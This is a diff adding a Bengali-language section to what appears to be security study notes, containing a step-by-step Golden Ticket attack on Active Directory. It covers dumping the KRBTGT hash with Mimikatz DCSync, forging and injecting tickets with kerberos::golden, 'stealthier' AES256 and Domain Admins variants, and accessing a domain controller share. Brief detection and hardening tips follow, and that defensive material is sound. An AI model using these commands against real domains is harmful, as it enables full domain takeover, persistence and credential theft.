@@ -203,3 +203,71 @@ sudo ufw enable
 Firewall + MFA চালু রাখুন
 নিয়মিত আপডেট নিন
 লগ মনিটর করুন
+
+### 🔑 Golden Ticket Attack
+
+প্রয়োজনীয় জিনিস (Prerequisites)
+KRBTGT অ্যাকাউন্টের NTLM Hash (সবচেয়ে গুরুত্বপূর্ণ)
+Domain SID
+Domain Name
+Mimikatz / Rubeus টুল
+KRBTGT Hash কীভাবে পাবেন? → সাধারণত DCSync অ্যাটাক করে।
+Golden Ticket তৈরির ধাপে ধাপে পদ্ধতি
+ধাপ ১: তথ্য সংগ্রহ করুন
+# Domain Name
+whoami /fqdn
+
+# Domain SID (Mimikatz দিয়ে)
+mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt
+ধাপ ২: Mimikatz দিয়ে Golden Ticket তৈরি করুন
+সবচেয়ে সাধারণ কমান্ড:
+mimikatz # kerberos::golden /user:Administrator 
+                  /domain:lab.local 
+                  /sid:S-1-5-21-1234567890-1234567890-1234567890 
+                  /krbtgt:a1b2c3d4e5f6... 
+                  /ptt
+ব্যাখ্যা প্রত্যেক প্যারামিটারের:
+/user:Administrator → যে নামে টিকিট তৈরি করবেন (যেকোনো নাম দিতে পারেন)
+/domain:lab.local → আপনার ডোমেইন নাম
+/sid:S-1-5-21-... → ডোমেইনের Security Identifier
+/krbtgt:xxxxxxxxxxxxxxxx → KRBTGT অ্যাকাউন্টের NTLM Hash
+/ptt → Pass The Ticket (বর্তমান সেশনে টিকিট ইনজেক্ট করে)
+ধাপ ৩: টিকিট ব্যবহার করে অ্যাক্সেস নিন
+# টিকিট সফলভাবে ইনজেক্ট হয়েছে কিনা চেক করুন
+mimikatz # kerberos::list
+
+# এখন যেকোনো মেশিনে অ্যাক্সেস নিন
+dir \\dc01.lab.local\c$
+আরও অ্যাডভান্সড Golden Ticket কমান্ড
+# AES256 Key ব্যবহার করে (আরও স্টেল্থি)
+mimikatz # kerberos::golden /user:admin 
+                  /domain:lab.local 
+                  /sid:S-1-5-21-... 
+                  /aes256:longaeskeyhere... 
+                  /ptt
+
+# Group Membership দিয়ে (Domain Admins)
+mimikatz # kerberos::golden /user:admin 
+                  /domain:lab.local 
+                  /sid:S-1-5-21-... 
+                  /krbtgt:hash 
+                  /groups:512,513,518,519 
+                  /ptt
+🔍 কীভাবে ডিটেক্ট করা হয়?
+Event ID 4769 (Kerberos Service Ticket Requested) – অস্বাভাবিক পরিমাণে
+KRBTGT অ্যাকাউন্ট থেকে অস্বাভাবিক replication (DCSync)
+Microsoft Defender for Identity, Sentinel, Corelight টুল ব্যবহার করে
+🛡️ প্রতিরোধের উপায় (Defensive)
+KRBTGT অ্যাকাউন্টের পাসওয়ার্ড নিয়মিত পরিবর্তন করুন (দুইবার পরিবর্তন করলে পুরনো টিকিট অকেজো হয়ে যায়)।
+Tiered Administration Model ব্যবহার করুন।
+"Protected Users" গ্রুপে সেনসিটিভ অ্যাকাউন্ট রাখুন।
+LAPS + Credential Guard চালু করুন।
+Replication permission খুব কম অ্যাকাউন্টকে দিন।
+
+```powershell
+# Mimikatz দিয়ে Golden Ticket তৈরি
+kerberos::golden /user:Administrator 
+                /domain:target.local 
+                /sid:S-1-5-21-... 
+                /krbtgt:NTLMHASH 
+                /ptt
